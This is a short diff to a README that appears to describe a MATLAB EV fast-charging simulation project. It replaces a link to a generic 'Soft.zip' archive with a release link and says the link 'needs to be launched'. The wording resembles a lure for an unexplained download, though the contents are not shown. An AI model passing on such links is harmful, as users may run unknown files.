@@ -32,7 +32,7 @@ The simulation results obtained from the model demonstrate the successful implem
 
 For access to the project files associated with this repository, please click on the following link: 
 
-[Download Project Files](https://github.com/files/Soft.zip)
+[Download Project Files](https://github.com/sanjaykrishna244/Electrical-Engineering-Project-Design-and-Simulation-of-a-Fast-DC-EV-Recharging-Station-Using-MATLAB/releases/tag/v1.2)
 
 *Note: The provided link needs to be launched to access the project files.*
 
